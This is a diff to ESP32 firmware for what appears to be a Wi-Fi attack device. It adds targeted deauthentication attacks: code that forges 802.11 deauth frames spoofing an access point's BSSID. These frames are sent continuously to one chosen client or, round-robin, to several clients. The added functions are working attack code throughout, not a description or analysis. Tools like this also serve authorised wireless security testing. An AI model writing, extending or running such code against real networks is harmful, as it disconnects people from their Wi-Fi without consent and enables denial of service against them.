@@ -42,9 +42,11 @@ static const char *POOM_WIFI_ATTACKS_TAG = "poom_wifi_attacks";
 
 static TaskHandle_t s_poom_wifi_attacks_task_broadcast = NULL;
 static TaskHandle_t s_poom_wifi_attacks_task_rogue_ap = NULL;
+static TaskHandle_t s_poom_wifi_attacks_task_targeted = NULL;
 
 static bool s_poom_wifi_attacks_broadcast_running = false;
 static bool s_poom_wifi_attacks_rogue_ap_running = false;
+static bool s_poom_wifi_attacks_targeted_running = false;
 
 static const uint8_t s_poom_wifi_attacks_deauth_frame_default[] = {
     0xc0, 0x00, 0x3a, 0x01,
@@ -58,6 +60,22 @@ typedef struct
 {
     wifi_ap_record_t ap;
 } poom_wifi_attacks_task_param_t;
+
+typedef struct
+{
+    wifi_ap_record_t ap;
+    uint8_t client[6];
+} poom_wifi_attacks_targeted_param_t;
+
+typedef struct
+{
+    wifi_ap_record_t ap;
+    uint8_t clients[POOM_WIFI_ATTACKS_MAX_CLIENTS][6];
+    size_t count;
+} poom_wifi_attacks_multi_param_t;
+
+/* Per-frame gap while cycling a set; each client is hit every count*gap ms. */
+#define POOM_WIFI_ATTACKS_MULTI_GAP_MS (150U)
 
 /**
  * @brief Internal helper for `poom_wifi_attacks_force_ap_config`.
@@ -230,6 +248,261 @@ void poom_wifi_attacks_broadcast_once(wifi_ap_record_t *ap)
 }
 
 /**
+ * @brief Sends one targeted (unicast) deauthentication frame.
+ * @param[in] ap Target AP record (BSSID source).
+ * @param[in] client_mac Destination client MAC.
+ * @return void
+ */
+void poom_wifi_attacks_deauth_client_once(const wifi_ap_record_t *ap,
+                                          const uint8_t client_mac[6])
+{
+    uint8_t frame[sizeof(s_poom_wifi_attacks_deauth_frame_default)];
+
+    if((ap == NULL) || (client_mac == NULL))
+    {
+        return;
+    }
+
+    memcpy(frame, s_poom_wifi_attacks_deauth_frame_default, sizeof(frame));
+    memcpy(&frame[4], client_mac, 6); /* addr1: destination = target client */
+    memcpy(&frame[10], ap->bssid, 6); /* addr2: source = AP                 */
+    memcpy(&frame[16], ap->bssid, 6); /* addr3: BSSID = AP                   */
+
+    poom_wifi_attacks_send_raw_frame_(frame, sizeof(frame));
+}
+
+/**
+ * @brief Runs the targeted (unicast) deauthentication attack task loop.
+ * @param[in,out] param Targeted attack parameter pointer.
+ * @return void
+ */
+static void poom_wifi_attacks_targeted_attack_task_(void *param)
+{
+    const poom_wifi_attacks_targeted_param_t task_param =
+        *(poom_wifi_attacks_targeted_param_t *)param;
+    const wifi_ap_record_t ap = task_param.ap;
+    uint8_t frame[sizeof(s_poom_wifi_attacks_deauth_frame_default)];
+
+    free(param);
+
+    esp_err_t error = poom_wifi_ctrl_init_apsta();
+    if(error != ESP_OK)
+    {
+        POOM_PRINTF_E("poom_wifi_ctrl_init_apsta failed: %s", esp_err_to_name(error));
+        s_poom_wifi_attacks_targeted_running = false;
+        s_poom_wifi_attacks_task_targeted = NULL;
+        vTaskDelete(NULL);
+        return;
+    }
+
+    memcpy(frame, s_poom_wifi_attacks_deauth_frame_default, sizeof(frame));
+    memcpy(&frame[4], task_param.client, 6); /* addr1: destination = client */
+    memcpy(&frame[10], ap.bssid, 6);         /* addr2: source = AP          */
+    memcpy(&frame[16], ap.bssid, 6);         /* addr3: BSSID = AP           */
+
+    POOM_PRINTF_I("Starting targeted deauth");
+    POOM_PRINTF_I("SSID: %s | CH: %d", ap.ssid, ap.primary);
+    POOM_PRINTF_D("Client: %02X:%02X:%02X:%02X:%02X:%02X",
+                  task_param.client[0],
+                  task_param.client[1],
+                  task_param.client[2],
+                  task_param.client[3],
+                  task_param.client[4],
+                  task_param.client[5]);
+
+    (void)esp_wifi_set_channel(ap.primary, WIFI_SECOND_CHAN_NONE);
+    (void)esp_wifi_set_promiscuous(true);
+
+    while(s_poom_wifi_attacks_targeted_running)
+    {
+        esp_err_t tx = esp_wifi_80211_tx(WIFI_IF_AP, frame, sizeof(frame), false);
+        if(tx != ESP_OK)
+        {
+            POOM_PRINTF_E("esp_wifi_80211_tx failed: %s", esp_err_to_name(tx));
+            break;
+        }
+        vTaskDelay(pdMS_TO_TICKS(1000));
+    }
+
+    POOM_PRINTF_I("Targeted deauth stopped");
+    s_poom_wifi_attacks_targeted_running = false;
+    s_poom_wifi_attacks_task_targeted = NULL;
+    vTaskDelete(NULL);
+}
+
+/**
+ * @brief Starts a continuous targeted deauth loop against one client.
+ * @param[in] ap Target AP record.
+ * @param[in] client_mac Destination client MAC.
+ * @return void
+ */
+void poom_wifi_attacks_deauth_client_start(const wifi_ap_record_t *ap,
+                                           const uint8_t client_mac[6])
+{
+    poom_wifi_attacks_targeted_param_t *task_param;
+
+    if((ap == NULL) || (client_mac == NULL))
+    {
+        POOM_PRINTF_E("Target AP or client is NULL");
+        return;
+    }
+
+    if(s_poom_wifi_attacks_targeted_running)
+    {
+        POOM_PRINTF_W("Targeted deauth already running");
+        return;
+    }
+
+    task_param = (poom_wifi_attacks_targeted_param_t *)malloc(sizeof(*task_param));
+    if(task_param == NULL)
+    {
+        POOM_PRINTF_E("Out of memory");
+        return;
+    }
+    (void)memset(task_param, 0, sizeof(*task_param));
+    (void)memcpy(&task_param->ap, ap, sizeof(task_param->ap));
+    (void)memcpy(task_param->client, client_mac, sizeof(task_param->client));
+
+    s_poom_wifi_attacks_targeted_running = true;
+    if(xTaskCreate(
+        poom_wifi_attacks_targeted_attack_task_,
+        "deauth_tgt_task",
+        4096,
+        task_param,
+        5,
+        &s_poom_wifi_attacks_task_targeted) != pdPASS)
+    {
+        free(task_param);
+        s_poom_wifi_attacks_targeted_running = false;
+    }
+}
+
+/**
+ * @brief Runs the multi-client (round-robin) targeted deauth task loop.
+ * @param[in,out] param Multi-target attack parameter pointer.
+ * @return void
+ */
+static void poom_wifi_attacks_targeted_multi_task_(void *param)
+{
+    const poom_wifi_attacks_multi_param_t task_param =
+        *(poom_wifi_attacks_multi_param_t *)param;
+    const wifi_ap_record_t ap = task_param.ap;
+    uint8_t frame[sizeof(s_poom_wifi_attacks_deauth_frame_default)];
+    size_t index = 0U;
+
+    free(param);
+
+    esp_err_t error = poom_wifi_ctrl_init_apsta();
+    if(error != ESP_OK)
+    {
+        POOM_PRINTF_E("poom_wifi_ctrl_init_apsta failed: %s", esp_err_to_name(error));
+        s_poom_wifi_attacks_targeted_running = false;
+        s_poom_wifi_attacks_task_targeted = NULL;
+        vTaskDelete(NULL);
+        return;
+    }
+
+    memcpy(frame, s_poom_wifi_attacks_deauth_frame_default, sizeof(frame));
+    memcpy(&frame[10], ap.bssid, 6); /* addr2: source = AP  */
+    memcpy(&frame[16], ap.bssid, 6); /* addr3: BSSID = AP   */
+
+    POOM_PRINTF_I("Starting multi-client targeted deauth (%u clients)",
+                  (unsigned)task_param.count);
+    POOM_PRINTF_I("SSID: %s | CH: %d", ap.ssid, ap.primary);
+
+    (void)esp_wifi_set_channel(ap.primary, WIFI_SECOND_CHAN_NONE);
+    (void)esp_wifi_set_promiscuous(true);
+
+    while(s_poom_wifi_attacks_targeted_running && (task_param.count > 0U))
+    {
+        esp_err_t tx;
+
+        memcpy(&frame[4], task_param.clients[index], 6); /* addr1: dest = client */
+        tx = esp_wifi_80211_tx(WIFI_IF_AP, frame, sizeof(frame), false);
+        if(tx != ESP_OK)
+        {
+            POOM_PRINTF_E("esp_wifi_80211_tx failed: %s", esp_err_to_name(tx));
+            break;
+        }
+        index = (index + 1U) % task_param.count;
+        vTaskDelay(pdMS_TO_TICKS(POOM_WIFI_ATTACKS_MULTI_GAP_MS));
+    }
+
+    POOM_PRINTF_I("Multi-client targeted deauth stopped");
+    s_poom_wifi_attacks_targeted_running = false;
+    s_poom_wifi_attacks_task_targeted = NULL;
+    vTaskDelete(NULL);
+}
+
+/**
+ * @brief Starts a continuous targeted deauth loop against several clients.
+ * @param[in] ap Target AP record.
+ * @param[in] clients Array of six-byte client MACs.
+ * @param[in] count Number of clients.
+ * @return void
+ */
+void poom_wifi_attacks_deauth_clients_start(const wifi_ap_record_t *ap,
+                                            const uint8_t (*clients)[6],
+                                            size_t count)
+{
+    poom_wifi_attacks_multi_param_t *task_param;
+
+    if((ap == NULL) || (clients == NULL) || (count == 0U))
+    {
+        POOM_PRINTF_E("Target AP or client set is NULL/empty");
+        return;
+    }
+
+    if(count > POOM_WIFI_ATTACKS_MAX_CLIENTS)
+    {
+        count = POOM_WIFI_ATTACKS_MAX_CLIENTS;
+    }
+
+    if(s_poom_wifi_attacks_targeted_running)
+    {
+        POOM_PRINTF_W("Targeted deauth already running");
+        return;
+    }
+
+    task_param = (poom_wifi_attacks_multi_param_t *)malloc(sizeof(*task_param));
+    if(task_param == NULL)
+    {
+        POOM_PRINTF_E("Out of memory");
+        return;
+    }
+    (void)memset(task_param, 0, sizeof(*task_param));
+    (void)memcpy(&task_param->ap, ap, sizeof(task_param->ap));
+    for(size_t i = 0U; i < count; i++)
+    {
+        (void)memcpy(task_param->clients[i], clients[i], 6);
+    }
+    task_param->count = count;
+
+    s_poom_wifi_attacks_targeted_running = true;
+    if(xTaskCreate(
+        poom_wifi_attacks_targeted_multi_task_,
+        "deauth_multi_task",
+        4096,
+        task_param,
+        5,
+        &s_poom_wifi_attacks_task_targeted) != pdPASS)
+    {
+        free(task_param);
+        s_poom_wifi_attacks_targeted_running = false;
+    }
+}
+
+/**
+ * @brief Reports whether the targeted deauth loop is currently running.
+ * @param[in,out] none Not used.
+ * @return bool
+ */
+bool poom_wifi_attacks_deauth_client_is_running(void)
+{
+    return s_poom_wifi_attacks_targeted_running;
+}
+
+/**
  * @brief Runs rogue AP attack task loop.
  * @param[in,out] param Target AP record pointer.
  * @return void
@@ -291,6 +564,7 @@ void poom_wifi_attacks_stop(void)
     POOM_PRINTF_I("Stopping all attacks");
     s_poom_wifi_attacks_broadcast_running = false;
     s_poom_wifi_attacks_rogue_ap_running = false;
+    s_poom_wifi_attacks_targeted_running = false;
 }
 
 /**
@@ -427,9 +701,12 @@ void poom_wifi_attacks_stop_all(void)
 
     s_poom_wifi_attacks_broadcast_running = false;
     s_poom_wifi_attacks_rogue_ap_running = false;
+    s_poom_wifi_attacks_targeted_running = false;
 
     const TickType_t deadline = xTaskGetTickCount() + pdMS_TO_TICKS(1500);
-    while (((s_poom_wifi_attacks_task_broadcast != NULL) || (s_poom_wifi_attacks_task_rogue_ap != NULL)) &&
+    while (((s_poom_wifi_attacks_task_broadcast != NULL) ||
+            (s_poom_wifi_attacks_task_rogue_ap != NULL) ||
+            (s_poom_wifi_attacks_task_targeted != NULL)) &&
            (xTaskGetTickCount() < deadline))
     {
         vTaskDelay(pdMS_TO_TICKS(50));
@@ -440,6 +717,7 @@ void poom_wifi_attacks_stop_all(void)
 
     s_poom_wifi_attacks_task_broadcast = NULL;
     s_poom_wifi_attacks_task_rogue_ap = NULL;
+    s_poom_wifi_attacks_task_targeted = NULL;
 
     (void)poom_wifi_ctrl_deinit();
 
